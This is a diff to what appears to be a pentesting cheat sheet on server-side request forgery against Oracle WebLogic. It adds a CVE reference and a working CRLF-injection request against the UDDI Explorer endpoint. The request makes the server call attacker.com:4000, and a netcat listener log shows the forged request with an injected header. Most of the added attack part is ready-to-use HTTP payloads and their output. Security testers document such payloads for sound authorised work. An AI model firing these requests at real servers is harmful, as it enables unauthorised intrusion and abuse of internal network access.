@@ -142,7 +142,7 @@ Note: the `_shutdown` API has been removed from Elasticsearch version 2.x. and u
 
 **Commonly bound ports: 80, 443 (SSL), 7001, 8888**
 
-**SSRF Canary: UDDI Explorer**
+**SSRF Canary: UDDI Explorer (CVE-2014-4210)**
 
 ```http
 POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
@@ -157,6 +157,37 @@ This also works via GET:
 
 ```bash
 http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+```
+
+This endpoint is also vulnerable to CRLF injection:
+
+```
+GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
+Host: vuln.weblogic
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
+Connection: close
+```
+
+Will result in the following request:
+
+```
+root@mail:~# nc -lvp 4000
+Listening on [0.0.0.0] (family 0, port 4000)
+Connection from example.com 43111 received!
+POST /exp HTTP/1.11
+X-CLRF: Injected HTTP/1.1
+Content-Type: text/xml; charset=UTF-8
+soapAction: ""
+Content-Length: 418
+User-Agent: Java1.6.0_24
+Host: attacker.com:4000
+Accept: text/html, image/gif, image/jpeg, */*; q=.2
+Connection: Keep-Alive
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
 ```
 
 **SSRF Canary: CVE-2020-14883**
